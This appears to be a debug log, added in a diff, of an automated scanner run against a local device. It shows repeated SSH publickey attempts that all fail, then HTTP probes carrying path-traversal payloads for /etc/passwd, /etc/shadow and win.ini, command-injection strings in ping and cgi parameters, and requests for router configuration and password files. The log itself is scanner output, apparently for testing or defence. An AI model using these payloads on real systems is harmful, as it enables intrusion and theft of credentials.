+2017-04-10 13:14:56,236 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:56,272 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:56,372 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:56,391 DEBUG paramiko.transport       starting thread (client mode): 0x45262e90L
+2017-04-10 13:14:56,391 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:56,469 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:56,469 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:56,478 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:56,478 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:56,478 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:56,478 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:56,478 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:56,761 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:56,762 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:56,792 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:56,793 DEBUG paramiko.transport       Trying SSH key b811320998f47d9470b85c03f270a421
+2017-04-10 13:14:56,805 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:56,822 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:56,923 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:56,942 DEBUG paramiko.transport       starting thread (client mode): 0x302c8410L
+2017-04-10 13:14:56,942 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:57,024 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:57,024 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:57,035 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:57,035 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:57,035 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:57,035 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:57,035 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:57,267 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:57,268 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:57,275 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:57,276 DEBUG paramiko.transport       Trying SSH key 27c6adf9a64d223f18b03bdf811c5745
+2017-04-10 13:14:57,466 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:57,483 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:57,583 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:57,601 DEBUG paramiko.transport       starting thread (client mode): 0x4529fc50L
+2017-04-10 13:14:57,602 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:57,679 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:57,680 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:57,688 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:57,688 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:57,688 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:57,688 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:57,688 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:57,928 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:57,929 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:57,944 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:57,945 DEBUG paramiko.transport       Trying SSH key 713ab018e26c41184e561efdd2499766
+2017-04-10 13:14:57,950 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:57,985 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:58,086 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:58,128 DEBUG paramiko.transport       starting thread (client mode): 0x4529f590L
+2017-04-10 13:14:58,129 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:58,214 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:58,214 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:58,221 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:58,221 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:58,221 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:58,222 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:58,222 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:58,452 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:58,453 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:58,460 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:58,461 DEBUG paramiko.transport       Trying SSH key f09610b7d63838def4b4d2df5ef82d74
+2017-04-10 13:14:58,490 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:58,527 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:58,628 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:58,680 DEBUG paramiko.transport       starting thread (client mode): 0x45262b10L
+2017-04-10 13:14:58,681 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:58,764 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:58,764 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:58,774 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:58,775 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:58,775 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:58,775 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:58,775 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:59,006 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:59,006 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:59,010 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:59,010 DEBUG paramiko.transport       Trying SSH key 0c8949f762d298f02775ade9722c68c3
+2017-04-10 13:14:59,103 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:59,134 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:59,234 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:59,260 DEBUG paramiko.transport       starting thread (client mode): 0x4349c090L
+2017-04-10 13:14:59,260 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:59,345 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:59,345 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:59,355 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:59,355 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:59,355 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:59,355 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:59,355 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:59,583 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:59,584 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:59,587 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:59,588 DEBUG paramiko.transport       Trying SSH key dd3bb82e850406e9abffa80ac0046ed6
+2017-04-10 13:14:59,726 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:59,757 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:59,857 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:15:19,644 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,645 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,649 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,650 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,651 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,652 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,653 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,820 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 302
+2017-04-10 13:15:19,822 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,824 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /filename.gwc HTTP/1.1" 404 289
+2017-04-10 13:15:19,826 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,833 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /img/favicon.png?v=6.0.1-1213 HTTP/1.1" 404 292
+2017-04-10 13:15:19,834 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd HTTP/1.1" 404 304
+2017-04-10 13:15:19,836 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,837 DEBUG paramiko.transport       starting thread (client mode): 0x302d7dd0L
+2017-04-10 13:15:19,837 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:19,840 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /login.cgi?logout=1 HTTP/1.1" 404 286
+2017-04-10 13:15:19,841 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,850 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 300
+2017-04-10 13:15:19,852 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,864 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /userRpm/DebugResultRpm.htm?cmd=echo%205dD77JA5PsX8co9Ztf6hFAzWv2RNV5vh&usr=osteam&passwd=5up HTTP/1.1" 404 303
+2017-04-10 13:15:19,866 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,868 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /cgi?2 HTTP/1.1" 404 280
+2017-04-10 13:15:19,870 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,873 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /s_brief.htm HTTP/1.1" 404 288
+2017-04-10 13:15:19,875 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,875 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /utility.cgi?testType=1&IP=aaa HTTP/1.1" 404 288
+2017-04-10 13:15:19,876 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,877 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /help/../../../../../../../../../../../../../../../../etc/shadow HTTP/1.1" 400 305
+2017-04-10 13:15:19,878 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,880 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 308
+2017-04-10 13:15:19,881 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,886 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /backupsettings.conf HTTP/1.1" 404 296
+2017-04-10 13:15:19,888 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,893 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /imc/reportscript/sqlserver/deploypara.properties HTTP/1.1" 404 325
+2017-04-10 13:15:19,894 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,896 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /SaveCfgFile.cgi HTTP/1.1" 404 292
+2017-04-10 13:15:19,898 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,914 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /goform/system/GatewaySettings.bin HTTP/1.1" 404 310
+2017-04-10 13:15:19,915 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /goform/system/GatewaySettings.bin HTTP/1.1" 404 310
+2017-04-10 13:15:19,916 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,919 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /app_sta.stm HTTP/1.1" 404 288
+2017-04-10 13:15:19,919 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /rpt/reportscript/sqlserver/deploypara.properties HTTP/1.1" 404 325
+2017-04-10 13:15:19,920 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /logo.jpg HTTP/1.1" 404 285
+2017-04-10 13:15:19,924 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,925 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,925 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /main/config.bin HTTP/1.1" 404 292
+2017-04-10 13:15:19,925 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,927 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,935 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /GatewaySettings.bin HTTP/1.1" 404 296
+2017-04-10 13:15:19,937 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,948 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/config.bin HTTP/1.1" 404 295
+2017-04-10 13:15:19,949 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /main/profile.wlp?PN=ggg HTTP/1.1" 404 293
+2017-04-10 13:15:19,950 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/script?system%20cat%20/etc/passwd HTTP/1.1" 404 291
+2017-04-10 13:15:19,952 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /imc/reportscript/oracle/deploypara.properties HTTP/1.1" 404 322
+2017-04-10 13:15:19,957 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,958 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /password.cgi HTTP/1.1" 404 289
+2017-04-10 13:15:19,958 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,960 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,970 DEBUG paramiko.transport       starting thread (client mode): 0x302c8e90L
+2017-04-10 13:15:19,970 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:15:19,977 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /main/event.logs HTTP/1.1" 404 292
+2017-04-10 13:15:19,979 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:19,996 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "HEAD /rom-0 HTTP/1.1" 404 0
+2017-04-10 13:15:19,998 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,000 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "POST /cgi-bin/proxy.cgi HTTP/1.1" 404 294
+2017-04-10 13:15:20,002 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,012 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /cgi-bin/index.cgi HTTP/1.1" 404 294
+2017-04-10 13:15:20,014 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,014 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /error_page.htm HTTP/1.1" 404 291
+2017-04-10 13:15:20,016 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,021 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:15:20,023 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,033 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd; HTTP/1.1" 404 322
+2017-04-10 13:15:20,033 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /HNAP1/ HTTP/1.1" 404 283
+2017-04-10 13:15:20,037 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,037 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,048 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /.htpasswd HTTP/1.1" 403 297
+2017-04-10 13:15:20,050 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET /view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd; HTTP/1.1" 404 319
+2017-04-10 13:15:20,050 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:15:20,052 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
